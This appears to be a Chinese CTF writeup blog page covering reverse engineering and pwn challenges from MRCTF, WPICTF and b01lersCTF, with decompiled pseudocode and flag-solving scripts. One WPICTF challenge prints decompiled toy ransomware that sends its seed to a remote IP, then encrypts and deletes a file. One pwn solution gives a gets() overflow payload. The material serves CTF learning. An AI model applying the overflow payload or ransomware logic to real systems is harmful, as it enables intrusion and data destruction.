4 * (v7 &amp; 0xF); for ( i = 0; i &lt; v3 + 1; ++v4 ) { v2 = (unsigned __int8)*(&amp;v16 + i++); LOBYTE(v2) = byte_41EA00[v2]; byte_421708[v4] = v2; } if ( v3 &lt; 3 ) LOBYTE(v2) = sub_4022E0(&amp;byte_421708[v4], 46, 3 - v3); } } return v2;} 这是一个类似于base64的一个编码过程，把三个字符转换成四个字符，只不过索引的计算用了一些位运算，仔细想一下很容易还原，到这里就可以把flag解出来了 123456789101112131415161718192021222324target = '%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm'#%w'flag = ''target1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&amp;*(+/'i = 0tmps = []# print(chr(0x2e))# print(len(target))while i &lt; len(target): index0 = target1.index(target[i]) index1 = target1.index(target[i + 1]) index2 = target1.index(target[i + 2]) index3 = target1.index(target[i + 3]) i += 4 tmp1 = index0 * 4 + ((index1 &amp; 0x30) &gt;&gt; 4) tmp2 = ((index1 &amp; 0xf) &lt;&lt; 4) + ((index2 &amp; 0x3c) &gt;&gt; 2) tmp3 = ((index2 &amp; 3) &lt;&lt; 6) + index3 tmps.append(tmp1) tmps.append(tmp2) tmps.append(tmp3)for i in tmps: tmp = (((i &amp; 0xf) &lt;&lt; 4) &amp; 0xff) + ((i &amp; 0xf0) &gt;&gt; 4) flag += chr(tmp ^ 3)print(flag+'}') 最后凑不齐三个字符，还有下面一套的编码方式，但我懒得看了……反正已经知道最后一个字符是'}'，干脆直接略过，输出flag 1MRCTF{junkjunkjunkcodejunkjunkcodejunkcode} 也就这题有点意思 pwn就做了两道题，第一题直接溢出，第二题shellcode，第三题看了是格式化字符串任意写也没什么意思，就不多写了","link":"/2020/03/30/MRCTF-wp/"},{"title":"WPICTF-re-wp","text":"这次的比赛只有两道re，全都是malware，不难，也还挺有意思 danger-Live-and-Malicious-Code病毒的代码里面混进了flag，js的语法也不是特别懂，发现了很多处理字符串的函数，所以干脆console.log都输出了出来，发现输出的url中间夹了flag 1WPI{Oh_nose_procoding_detected} NotWannasigh首先看下ransom note 1234Haha! Your precious file flag.gif has been encrypted by my new and improved ransomware NotWannasigh! You must send bitcoin to \"bitpay.com/83768\" to get the decryption key. You should act fast because in 48 hours I will delete the key. Muahahahaha! - def-not-h4ckah(Hi, CTF challenge creator here. You should _NEVER_ pay the ransom. If you send bitcoin to that BTC wallet then you will ONLY be donating to charity (and hey, that's really nice of you, Mental Health Hackers is a great organization). I will NOT send you the decryption key) 题目中所给的flag-gif.EnCiPhErEd应该就是加密过的文件，解密就可以得到flag，给的流量包暂时不知道作用是什么，干脆先看看程序的实现 123456789101112131415161718192021222324252627*(_QWORD *)seed = time(0LL); srand(seed[0]); fd = socket(2, 1, 0); if ( fd == -1 ) { puts(\"could not create socket\"); } else { puts(\"created socket\"); *(_DWORD *)&amp;addr.sa_data[2] = inet_addr(\"108.61.127.136\"); addr.sa_family = 2; *(_WORD *)addr.sa_data = htons(0x50u); if ( connect(fd, &amp;addr, 0x10u) &gt;= 0 ) { puts(\"connected\"); sprintf(&amp;s, \"%d\", *(_QWORD *)seed); if ( send(fd, &amp;s, 0xAuLL, 0) &gt;= 0 ) puts(\"sent\"); else puts(\"send failed\"); } else { puts(\"connect error\"); } } 先根据当前时间生成了一个随机数种子，然后进行通信，把这个种子发给了一个ip，这个种子肯定是后面生成随机数用的，所以肯定是有用的，这也就是流量包的作用，根据流量信息可以获得这个随机数种子的值1585599106 下面生成了一个随机数序列 1234567891011121314puts(\"targetting flag.gif\");stream = fopen(\"flag.gif\", \"r+\");fseek(stream, 0LL, 2);v19 = ftell(stream);fseek(stream, 0LL, 0);printf(\"fileSize = %d\\n\", (unsigned int)v19);v18 = v19 - 1LL;v8 = v19;v9 = 0LL;v3 = alloca(16 * ((v19 + 15LL) / 0x10uLL));v17 = &amp;v6;for ( i = 0; i &lt; v19; ++i ) *((_BYTE *)v17 + i) = rand();puts(\"key generated by 256\"); 生成了key，下面是加密过程 12345678910111213for ( j = 0; ; ++j ) { v14 = fgetc(stream); if ( j &gt;= v19 ) break; *((_BYTE *)v15 + j) = v14 ^ *((_BYTE *)v17 + j); } fclose(stream); remove(\"flag.gif\"); v13 = fopen(\"flag-gif.EnCiPhErEd\", \"w+\"); for ( k = 0; k &lt; v19; ++k ) fputc(*((unsigned __int8 *)v15 + k), v13); fclose(v13); 简单异或之后写入文件，所以生成随机数序列之后再异或回来就好了 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;cstdio&gt;using namespace std;int main(){ srand(1585599106); FILE *s = fopen(\"../flag-gif.EnCiPhErEd\", \"r\"); int index = 0; FILE *f = fopen(\"../flag.gif\", \"w+\"); while (!feof(s)) { int uVar1 = rand()&amp;0xff; int8_t tmp2=fgetc(s); int8_t tmp = uVar1 ^ tmp2; fputc(tmp, f); index = (int32_t)index + 1; } fclose(s); fclose(f); return 0;} 这个脚本要在linux下跑，因为win的随机数生成的不一样 得到了含有flag的gif flag有点难读，第一遍还读错了一位 1WPI{It_always_feels_a_little_weird_writing_malware}","link":"/2020/04/20/WPICTF-re-wp/"},{"title":"b01lersCTF-2020-wp","text":"这个比赛还算友好，而且少见的逆向比web还要多，出题人说之后会放源码和官方writeup，是个不错的学习的机会，这里把做出来的几道题先写一下（然后开始写作业…… webWelcome to Earth我对web实际上是毫无兴趣的，但这题实在简单的过分，还是给做了，详细的就不说了，查看源码就可以发现，只要在调用dead之前进入到应该进去的页面就可以了（直接F12里debug暂停然后慢慢看就可以了…… pwnpwn也很久没做了，知识点还停留在刚学的时候，应付一下第一题就完事了 Department of Flying VehiclesIDA打开(逆向看久了之后发现pwn题目的逻辑真的是简单得要命)，漏洞也看得出来，利用的话还是不熟练，需要多练 123456789101112131415161718192021222324252627282930313233343536__int64 __fastcall main(__int64 a1, char **a2, char **a3){ __int64 v3; // rax char s1[8]; // [rsp+0h] [rbp-20h] __int64 v6; // [rsp+8h] [rbp-18h] __int64 v7; // [rsp+10h] [rbp-10h] unsigned __int64 v8; // [rsp+18h] [rbp-8h] v8 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); v6 = 1176165807576793170LL; v7 = 1154282520852565777LL; puts(\"Dave has ruined our system. He updated the code, and now he even has trouble checking his own liscense!\"); puts(\"If you can please make it work, we'll reward you!\\n\"); puts(\"Welcome to the Department of Flying Vehicles.\"); printf(\"Which liscense plate would you like to examine?\\n &gt; \", 0LL); gets(s1); if ( v6 == (v7 ^ *(_QWORD *)s1) ) { if ( !strncmp(s1, \"COOLDAV\", 8uLL) ) { puts(\"Hi Dave!\"); } else { v3 = sub_96A(\"flag.txt\", \"COOLDAV\"); printf(\"Thank you so much! Here's your reward!\\n%s\", v3); } } else { puts(\"Error.\"); } return 0LL;} 如果想要通过第一个if就必须要输入COOLDAV，这样的话就过不了第二个输入，看到gets直接考虑溢出覆盖变量的值，最简单的方法就是输入和其中的一个变量全都为\\0 123456789from pwn import *# io=process('./dfv')io=remote('pwn.ctf.b01lers.com',1001)io.recvuntil('Which liscense plate would you like to examine?\\n &gt; ')payload=4*p64(0)io.sendline(payload)io.interactive() 就可以拿到flag(但我忘了记录flag得值又懒得再跑一遍拿flag) ReChugga ChuggaIDA打开 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171void __fastcall __noreturn main_main(__int64 a1, __int64 a2){ signed __int64 i; // rcx __int64 v3; // r8 __int64 v4; // r9 __int64 v5; // r8 __int64 v6; // r9 __int64 v7; // r8 __int64 v8; // r9 __int64 v9; // r8 __int64 v10; // r9 unsigned __int64 v11; // rcx _BYTE *v12; // rdx signed __int64 v13; // rax char v14; // bl char v15; // r10 int v16; // er11 char v17; // r12 char v18; // r13 int v19; // er13 int v20; // er14 int v21; // ecx int v22; // er14 char v23; // cl unsigned int v24; // er13 char v25; // r11 char v26; // r12 _QWORD *v27; // [rsp+8h] [rbp-A0h] signed __int64 v28; // [rsp+40h] [rbp-68h] _QWORD *v29; // [rsp+48h] [rbp-60h] __int128 v30; // [rsp+50h] [rbp-58h] __int128 v31; // [rsp+60h] [rbp-48h] __int128 v32; // [rsp+70h] [rbp-38h] __int128 v33; // [rsp+80h] [rbp-28h] __int128 v34; // [rsp+90h] [rbp-18h] if ( (unsigned __int64)&amp;v33 &lt;= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(); runtime_newobject(a1, a2); v29 = v27; for ( i = 0LL; ; i = v13 ) { v28 = i; runtime_convT64(a1, a2); *(_QWORD *)&amp;v33 = &amp;unk_4A4C40; *((_QWORD *)&amp;v33 + 1) = &amp;main_statictmp_2; *(_QWORD *)&amp;v34 = &amp;unk_4A4480; *((_QWORD *)&amp;v34 + 1) = v27; a2 = (__int64)&amp;go_itab__os_File_io_Writer; fmt_Fprintln( a1, (__int64)&amp;go_itab__os_File_io_Writer, (__int64)&amp;main_statictmp_2, (__int64)&amp;unk_4A4C40, v3, v4, (__int64)&amp;go_itab__os_File_io_Writer, os_Stdout); *(_QWORD *)&amp;v32 = &amp;unk_4A4C40; *((_QWORD *)&amp;v32 + 1) = &amp;main_statictmp_3; fmt_Fprintln( a1, (__int64)&amp;go_itab__os_File_io_Writer, (__int64)&amp;v32, (__int64)&amp;main_statictmp_3, v5, v6, (__int64)&amp;go_itab__os_File_io_Writer, os_Stdout); *(_QWORD *)&amp;v31 = &amp;unk_4A1DC0; *((_QWORD *)&amp;v31 + 1) = v29; fmt_Fscan( a1, (__int64)&amp;go_itab__os_File_io_Writer, (__int64)&amp;v31, (__int64)v29, v7, v8, (__int64)&amp;go_itab__os_File_io_Reader, os_Stdin); v11 = v29[1]; v12 = (_BYTE *)*v29; if ( v11 &lt;= 2 ) break; if ( v12[2] != 116 ) goto LABEL_39; if ( v11 &lt;= 9 ) break; a2 = (unsigned __int8)v12[9]; if ( (_BYTE)a2 != 99 ) goto LABEL_39; if ( v11 &lt;= 0x10 ) break; a1 = (unsigned __int8)v12[16]; if ( (_BYTE)a1 != 110 ) goto LABEL_39; if ( v11 &lt;= 0x15 ) break; v9 = (unsigned __int8)v12[21]; if ( (_BYTE)v9 != 122 ) goto LABEL_39; if ( v11 &lt;= 0x16 ) break; if ( v12[22] != 125 ) goto LABEL_39; v10 = (unsigned __int8)v12[5]; if ( 115 != (_BYTE)v10 ) goto LABEL_39; if ( (v12[3] ^ 0x74) != 18 ) goto LABEL_39; v14 = v12[1]; if ( v14 != 99 ) goto LABEL_39; a2 = (unsigned __int8)v12[7]; if ( (_BYTE)a2 != 100 ) goto LABEL_39; v15 = v12[13]; if ( v12[12] != v15 ) goto LABEL_39; if ( 122 != v12[19] ) goto LABEL_39; v9 = (unsigned __int8)v12[14]; v16 = (unsigned __int8)v12[6]; if ( (_BYTE)v16 + (_BYTE)v9 != 104 ) goto LABEL_39; v17 = v12[4]; if ( 123 != v17 ) goto LABEL_39; v18 = v12[8]; if ( v12[15] != v18 ) goto LABEL_39; if ( v18 + 4 != v14 ) goto LABEL_39; v19 = (unsigned __int8)v12[17]; v20 = (unsigned __int8)v12[11]; if ( 125 - (_BYTE)v19 + 40 != (_BYTE)v20 ) goto LABEL_39; v21 = (unsigned __int8)v12[18]; v22 = v19 + v20 - v10 - v21; v23 = v21 - v19; if ( (_BYTE)v22 != v23 || (v24 = v16 - v19, *v12 != v23 * ((unsigned __int8)v24 &gt;&gt; 1) + 110) || (v25 = v12[10], v15 + 1 != v25) || (v26 = v17 - a2, a2 = v24, (_BYTE)v24 + 2 * (_BYTE)v24 + 4 * v26 != v25) || v12[20] - v14 != 2 * v23 || (v10 = (unsigned int)a1 ^ (unsigned int)v10, (_BYTE)v10 != 29) || (_BYTE)v24 != 4 * v23 || v12[6] != (_BYTE)v9 ) {LABEL_39: *(_QWORD *)&amp;v30 = &amp;unk_4A4C40; *((_QWORD *)&amp;v30 + 1) = &amp;main_statictmp_4; fmt_Fprintln( a1, a2, (__int64)&amp;v30, (__int64)&amp;main_statictmp_4, v9, v10, (__int64)&amp;go_itab__os_File_io_Writer, os_Stdout); v13 = v28 + 1; } else { main_win(); v13 = v28; } } runtime_panicindex(a1, a2, v12);} 所有的判断条件都在这个函数里，直接根据条件解出来flag就可以了，至于为什么不写具体的过程，因为我是在演草纸上自己动手解的方程，只要耐心分析就可以了 这里有一个疑问，标记一下，解方程的时候可以解出来两解，应该有地方可以排除掉，但我直接根据语义选择的flag 1pctf{s4d_chugg4_n01zez} Dank Engine脑洞题(这游戏根本就玩不过去…… 走到地图中间怎么都跳不上去，到了最右边发现不能走了但是地图没完，后面接着长长的一条路，所以一直往右边拉，看到pctf，找到了flag的位置 (然后为了找flag跑崩了四次虚拟机……显卡和cpu看样8太行) 用鼠标上下没法超出屏幕，用alt+f7移动窗口慢慢找，感觉应该有逆向方法，那个pck包我至今还没解开 1PCTF{ITWASTIMEFORTHOMASTOGO_HEHADSEENEVERYTHING} 来补充一下，IDA可以直接打开pck包，里面有关于人物的设定 12345678'# Global Variables',0Ahseg000:0000000000004610 db 'var g_direction',0Ahseg000:0000000000004610 db 'var g_velocity',0Ahseg000:0000000000004610 db 'var g_parent',0Ahseg000:0000000000004610 db 'var g_airborne',0Ahseg000:0000000000004610 db 'var g_delta',0Ahseg000:0000000000004610 db 'var g_cheat_stack',0Ahseg000:0000000000004610 db 'var g_god_mode',0Ah 惊奇的发现下面还有一个上帝模式和开启方法 123 db 9,'if self.g_cheat_stack == [\"P\", \"U\", \"R\", \"G\", \"0\", \"0\"]:',0Ahseg000:0000000000004610 db 9,9,'self.g_god_mode = not self.g_god_mode',0Ahseg000:0000000000004610 db 9,9,'$CollisionShape2D.disabled = not $CollisionShape2D.disabled',0Ah 方法就是按键直接输入PURG00，打开之后就可以飞和穿墙，直接跑到flag在的地方去看就可以了 (亏我还调窗口大小调了这么久) Digital Sloth这题的逻辑很简单 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869__int64 __fastcall main(__int64 a1, char **a2, char **a3){ signed int v3; // esi signed __int64 v4; // rdx signed __int64 v5; // r12 int *v6; // r13 __int64 v7; // rax signed __int64 v8; // rbp unsigned __int64 v9; // rdx signed int v10; // eax int v11; // edi int v12; // ecx __int64 v14; // [rsp+0h] [rbp-68h] __int64 v15; // [rsp+8h] [rbp-60h] __int64 v16; // [rsp+10h] [rbp-58h] __int64 v17; // [rsp+18h] [rbp-50h] __int64 v18; // [rsp+20h] [rbp-48h] __int64 v19; // [rsp+28h] [rbp-40h] int v20; // [rsp+30h] [rbp-38h] int v21; // [rsp+34h] [rbp-34h] unsigned __int64 v22; // [rsp+38h] [rbp-30h] v3 = 51; v4 = 3LL; v5 = 113LL; v22 = __readfsqword(0x28u); v20 = 1422670297; v14 = -3319278099595541965LL; v6 = (int *)((char *)&amp;v14 + 1); v15 = -422936419575592362LL; v16 = -4095196370651919852LL; v17 = 8155891993347461205LL; v18 = 2743091852077296222LL; v19 = -5317187183026317550LL; while ( 1 ) { v7 = 0LL; v8 = 1LL; if ( v4 ) { do { ++v7; v8 *= v5; } while ( v7 != v4 ); } v9 = v8; v10 = 8; v11 = 0; do { v12 = (unsigned __int8)v9; v9 &gt;&gt;= 8; v11 ^= v12; --v10; } while ( v10 ); _IO_putc(v3 ^ v11, stdout); fflush(stdout); if ( &amp;v21 == v6 ) break; v3 = *(unsigned __int8 *)v6; v4 = v5; v6 = (int *)((char *)v6 + 1); v5 = v8; } return 0LL;} 直接会输出flag的那种，但是一运行只输出了三个字符，明显是计算大数乘幂的时候算法时间复杂度太高了(O(n^2))，想要算出flag必须手动优化一下算法，利用平方把时间复杂度优化到**O(logn)**，在大数的时候明显优化的不是一点 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;using namespace std;typedef unsigned long long ull;ull qpow(ull x, ull n) { ull res = 1; ull mod = 0xffffffffffffffff; while (n) { if (n &amp; 1) res = res * x &amp; mod; //如果二进制最低位为1，则乘上x^(2^i) x = x * x &amp; mod; n &gt;&gt;= 1; } return res;}int main() { ull v4; // rdx ull v5; // r12 ull v8; // rbp ull v9; // rdx signed int v10; // eax int v11; // edi int v12; // ecx v4 = 3; v5 = 113; int v3[] = {0x33, 0xC2, 0xDF, 0x9A, 0x27, 0x8E, 0xEF, 0xD1, 0x56, 0x0A, 0x9F, 0x34, 0x91, 0x6D, 0x21, 0xFA, 0x14, 0xCA, 0xD2, 0x21, 0x99, 0xF0, 0x2A, 0xC7, 0x55, 0x90, 0xED, 0x61, 0x8E, 0x8C, 0x2F, 0x71, 0x5E, 0xEA, 0x55, 0x85, 0x81, 0x6B, 0x11, 0x26, 0x12, 0xD7, 0x74, 0xBF, 0x6D, 0x8E, 0x35, 0xB6, 0xD9, 0x39, 0xCC, 0x54}; for (int i = 0; i &lt; 52; i++) { v8 = 1; if (v4) { v8 *= qpow(v5, v4); } v9 = v8; v10 = 8; v11 = 0; do { v12 = v9 &amp; 0xff; v9 &gt;&gt;= 8; v11 ^= v12; --v10; } while (v10); char tmp=v3[i] ^ v11; cout &lt;&lt; tmp; v4 = v5; v5 = v8; } return 0;} 又是一道分割线，看了其它大佬的wp才知道……直接用python的pow不就好了…… 直接输出flag 1pctf{one man's trash is another man's V#x0GFu_Lp%3} 看到最后一段甚至感觉做错了，到现在没看懂 train_armsarm一语双关，妙啊 这题就直接看汇编了 123456789101112131415161718192021222324252627282930313233343536.cpu cortex-m0.thumb.syntax unified.fpu softvfp.data flag: .string \"REDACTED\" //len = 28.text.global mainmain: ldr r0,=flag eors r1,r1 eors r2,r2 movs r7,#1 ; r7=1 movs r6,#42 ; r6=42loop: ldrb r2,[r0,r1] cmp r2,#0 beq exit lsls r3,r1,#0 ands r3,r7 ; 区分奇偶位 cmp r3,#0 bne f1//if odd strb r2,[r0,r1] adds r1,#1 b loopf1: eors r2,r6 strb r2,[r0,r1] adds r1,#1 b loopexit: wfi 虽然没怎么接触过arm的汇编，但是这里还是很容易的，把flag分奇偶位进行操作，奇数位不动，偶数位异或42，最终结果输出到文件，所以打开文件 17049744c7b5e721e31447375641a6e5e5f42345c337561586d597d 明显16进制输出，写个脚本跑一下 123456789target = [0x70, 0x49, 0x74, 0x4c, 0x7b, 0x5e, 0x72, 0x1e, 0x31, 0x44, 0x73, 0x75, 0x64, 0x1a, 0x6e, 0x5e, 0x5f, 0x42, 0x34, 0x5c, 0x33, 0x75, 0x61, 0x58, 0x6d, 0x59, 0x7d]flag = ''for i in range(len(target)): if i &amp; 1: flag += chr(target[i] ^ 42) else: flag += chr(target[i])print(flag) 直接输出flag 1pctf{tr41ns_d0nt_h4v3_arms} Little Engine 我觉得这题很不错，难度比较适中，还可以加深对于数据在内存中占用位数的理解 1234567891011121314151617181920212223242526272829303132333435363738394041__int64 __usercall main@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, char **a2@&lt;rsi&gt;, char **a3@&lt;rdx&gt;, __int64 a4@&lt;rbx&gt;, _QWORD *a5@&lt;r12&gt;){ signed __int64 v5; // rdx unsigned __int64 v6; // rcx const char *v7; // rsi __int64 v8; // rdx __int64 v9; // rcx __int64 v10; // rdi __int64 v12; // [rsp+0h] [rbp-28h] unsigned __int64 v13; // [rsp+18h] [rbp-10h] __asm { endbr64 } v13 = __readfsqword(0x28u); sub_16B0(a1, a2, a3); sub_1830(&amp;v12); sub_1510(v5, v6, a4, &amp;v12, &amp;v12, (unsigned __int64)a2, a5); if ( (unsigned __int8)sub_15A0(&amp;v12) ) { v7 = \"Chugga chugga choo choo you're the little engine that CAN!\"; sub_11F0(&amp;std::cout, \"Chugga chugga choo choo you're the little engine that CAN!\", 58LL); } else { v7 = \"I guess you don't know anything about trains...go do some TRAINing you non-conductor :(\"; sub_11F0( &amp;std::cout, \"I guess you don't know anything about trains...go do some TRAINing you non-conductor :(\", 87LL); } sub_1170(&amp;std::cout); v10 = v12; if ( v12 ) sub_11C0(v12, v7, v8, v9); if ( __readfsqword(0x28u) != v13 ) { sub_11E0(v10, v7, v8, v9); __asm { endbr64 } JUMPOUT(&amp;loc_12D1); } return 0LL;} 话好多，第一句说明正确，第二句说明错误，逻辑就很清楚了，if的条件是一个用来判断的函数 程序在sub_1830()里进行输入，在sub_1510()进行了一些处理然后判断 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163__int64 *__fastcall sub_1830(__int64 *a1){ __int64 *v1; // r12 unsigned __int64 v2; // rsi unsigned __int8 *v3; // rdx __int64 v4; // rcx __int64 v5; // rbx __int64 v6; // r13 __int64 v7; // rax char *v8; // rdi char *v9; // r8 __int64 v10; // rdx _BYTE *v11; // rax char *v13; // [rsp+0h] [rbp-58h] __int64 v14; // [rsp+8h] [rbp-50h] char v15; // [rsp+10h] [rbp-48h] unsigned __int64 v16; // [rsp+28h] [rbp-30h] __asm { endbr64 } v1 = a1; v16 = __readfsqword(0x28u); sub_11F0(&amp;std::cout, \"Now, I hope you're a total trainiac. Give me your best tidbit: \", 63LL); v2 = (unsigned __int64)&amp;v13; v13 = &amp;v15; v14 = 0LL; v15 = 0; sub_1220(&amp;std::cin, &amp;v13); v5 = v14; v6 = (__int64)v13; a1[2] = 0LL; *(_OWORD *)a1 = 0LL; if ( v5 &lt; 0 ) {LABEL_32: sub_1190(\"cannot create std::vector larger than max_size()\"); __asm { endbr64 } JUMPOUT(&amp;loc_12AA); } if ( v5 ) { v7 = sub_11D0(v5); v8 = (char *)(v7 + v5); *v1 = v7; v9 = v13; v1[2] = v7 + v5; if ( (unsigned __int64)(v6 + 15 - v7) &lt;= 0x1E || (unsigned __int64)(v5 - 1) &lt;= 0xE ) { v3 = 0LL; do { v4 = v3[v6]; (v3++)[v7] = v4; } while ( (unsigned __int8 *)v5 != v3 ); } else { v10 = 0LL; do { *(__m128i *)(v7 + v10) = _mm_loadu_si128((const __m128i *)(v6 + v10)); v10 += 16LL; } while ( v10 != (v5 &amp; 0xFFFFFFFFFFFFFFF0LL) ); v2 = v5 &amp; 0xFFFFFFFFFFFFFFF0LL; v4 = v5 &amp; 0xF; v3 = (unsigned __int8 *)(v6 + (v5 &amp; 0xFFFFFFFFFFFFFFF0LL)); v11 = (_BYTE *)((v5 &amp; 0xFFFFFFFFFFFFFFF0LL) + v7); if ( v5 != (v5 &amp; 0xFFFFFFFFFFFFFFF0LL) ) { v2 = *v3; *v11 = v2; if ( v4 != 1 ) { v2 = v3[1]; v11[1] = v2; if ( v4 != 2 ) { v2 = v3[2]; v11[2] = v2; if ( v4 != 3 ) { v2 = v3[3]; v11[3] = v2; if ( v4 != 4 ) { v2 = v3[4]; v11[4] = v2; if ( v4 != 5 ) { v2 = v3[5]; v11[5] = v2; if ( v4 != 6 ) { v2 = v3[6]; v11[6] = v2; if ( v4 != 7 ) { v2 = v3[7]; v11[7] = v2; if ( v4 != 8 ) { v2 = v3[8]; v11[8] = v2; if ( v4 != 9 ) { v2 = v3[9]; v11[9] = v2; if ( v4 != 10 ) { v2 = v3[10]; v11[10] = v2; if ( v4 != 11 ) { v2 = v3[11]; v11[11] = v2; if ( v4 != 12 ) { v2 = v3[12]; v11[12] = v2; if ( v4 != 13 ) { v2 = v3[13]; v11[13] = v2; if ( v4 != 14 ) { v3 = (unsigned __int8 *)v3[14]; v11[14] = (_BYTE)v3; } } } } } } } } } } } } } } } } } else { v9 = (char *)v6; v8 = 0LL; } v1[1] = (__int64)v8; if ( v9 != &amp;v15 ) { v8 = v9; sub_11C0(v9, v2, v3, v4); } if ( __readfsqword(0x28u) != v16 ) { sub_11E0(v8, v2, v3, v4); goto LABEL_32; } return v1;} 程序看起来异常复杂，但是经过我的仔细分(tiao)析(shi)，发现只是把输入拷贝到了内存里分配好的空间。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869__int64 __usercall sub_1510@&lt;rax&gt;(signed __int64 a1@&lt;rdx&gt;, unsigned __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;rbx&gt;, void *a4@&lt;rbp&gt;, __int64 *a5@&lt;rdi&gt;, unsigned __int64 a6@&lt;rsi&gt;, _QWORD *a7@&lt;r12&gt;){ _QWORD *v7; // rax __int64 v8; // rdx __int64 v9; // rcx __int64 v10; // rdx __int64 v11; // rcx __int64 v12; // rdx __int64 v13; // rcx char **v14; // rdx __int64 v15; // rax _BYTE *v16; // rax __int64 v17; // rcx __int64 v18; // rcx __int64 result; // rax unsigned __int64 v20; // rt1 unsigned __int64 v21; // [rsp+18h] [rbp-10h] void *retaddr; // [rsp+28h] [rbp+0h] __asm { endbr64 } v21 = __readfsqword(0x28u); v15 = *a5; if ( *a5 == a5[1] ) {LABEL_5: v20 = __readfsqword(0x28u); result = v20 ^ v21; if ( v20 != v21 ) { sub_11E0(a5, a6, a1, a2); result = sub_15A0(a5); } } else { a6 = 0LL; a1 = 4294967185LL; while ( 1 ) { v16 = (_BYTE *)(a6 + v15); v17 = (unsigned __int8)*v16; if ( (_BYTE)v17 == 10 ) break; *v16 = a1 ^ v17; v18 = (unsigned __int8)a1 + a6++; v15 = *a5; a1 = (unsigned int)v18 + (unsigned int)((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v18 &gt;&gt; 64) &gt;&gt; 7); a2 = a5[1] - *a5; if ( a6 &gt;= a2 ) goto LABEL_5; } v7 = (_QWORD *)sub_1180(8LL, a6, a1, v17, -9187201950435737471LL); *v7 = &amp;unk_3CD0; sub_1250(v7, &amp;`typeinfo for'std::exception, &amp;std::exception::~exception); sub_11C0(a4, &amp;`typeinfo for'std::exception, v8, v9); sub_1260(a7); if ( *a7 ) sub_11C0(*a7, &amp;`typeinfo for'std::exception, v10, v11); if ( retaddr != a4 ) sub_11C0(retaddr, &amp;`typeinfo for'std::exception, v10, v11); sub_1260(a3); if ( retaddr ) sub_11C0(retaddr, &amp;`typeinfo for'std::exception, v12, v13); sub_1260(a4); result = main((__int64)a4, (char **)&amp;`typeinfo for'std::exception, v14); } return result;} 这又是一个异常复杂的函数，但实际上有用的内容并不多 1234567891011121314151617a6 = 0LL; a1 = 4294967185LL; while ( 1 ) { v16 = (_BYTE *)(a6 + v15); v17 = (unsigned __int8)*v16; if ( (_BYTE)v17 == 10 ) break; *v16 = a1 ^ v17; v18 = (unsigned __int8)a1 + a6++; v15 = *a5; a1 = (unsigned int)v18 + (unsigned int)((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v18 &gt;&gt; 64) &gt;&gt; 7); a2 = a5[1] - *a5; if ( a6 &gt;= a2 ) goto LABEL_5; } 只有这里是对输入的处理，整个处理过程也就只有一个异或而已，这里比较有意思的是循环停止的判断条件，a5实际上是个数组，里面存放了两个地址，一个是我们输入的字符串开始的地址，另一个是结束的地址，实际上相减出来的值就是字符串的长度，但是看起来就比较复杂，逆向的时候理解起来就有些困难。 这里的处理其实很好办，a1这个值和我们的输入没关系，是循环中依据算法生成的，我们可以通过同样的算法生成，然后存放在一个数组里。 接下来是判断函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556__int64 __fastcall sub_15A0(__int64 *a1){ _QWORD *v1; // rbp __int64 v2; // rsi __int64 v3; // rcx __int64 v4; // rdx unsigned int v5; // er12 const char *v6; // rdi __int64 v7; // rdx __int64 v8; // rcx __int64 v10; // [rsp+0h] [rbp-158h] __int64 v11; // [rsp+124h] [rbp-34h] unsigned __int64 v12; // [rsp+138h] [rbp-20h] __asm { endbr64 } v12 = __readfsqword(0x28u); qmemcpy(&amp;v10, &amp;unk_2220, 0x12CuLL); v1 = (_QWORD *)sub_11D0(300LL); *v1 = v10; *(_QWORD *)((char *)v1 + 292) = v11; qmemcpy( (void *)((unsigned __int64)(v1 + 1) &amp; 0xFFFFFFFFFFFFFFF8LL), (const void *)((char *)&amp;v10 - ((char *)v1 - ((unsigned __int64)(v1 + 1) &amp; 0xFFFFFFFFFFFFFFF8LL))), 8LL * (((unsigned int)v1 - (((_DWORD)v1 + 8) &amp; 0xFFFFFFF8) + 300) &gt;&gt; 3)); v2 = 0LL; v3 = *a1; v4 = a1[1] - *a1; while ( 1 ) { if ( v2 == v4 ) { v6 = \"vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)\"; sub_1230(\"vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)\", v2, v2); goto LABEL_10; } if ( *((_BYTE *)v1 + 4 * v2) != *(_BYTE *)(v3 + v2) ) break; if ( ++v2 == 75 ) { v5 = 1; goto LABEL_6; } } v5 = 0;LABEL_6: v6 = (const char *)v1; sub_11C0(v1, v2, v4, v3); if ( __readfsqword(0x28u) != v12 ) {LABEL_10: sub_11E0(v6, v2, v7, v8); __asm { endbr64 } JUMPOUT(&amp;loc_129A); } return v5;} 各种操作看着吓人，仔细一看，只有一个直接比较 1if ( *((_BYTE *)v1 + 4 * v2) != *(_BYTE *)(v3 + v2) ) 前面的生成方式很复杂，但是可以不用去管，通过动态调试就可以调试出来目标数组，不过目标生成出来都是64位数据，比较的时候只取最低8位进行比较，还需要进行一些处理。 然后直接把处理过后的目标数组和之前依据相同算法生成出来的数组逐项异或就可以得到flag 1234567891011121314151617181920212223242526272829303132#include 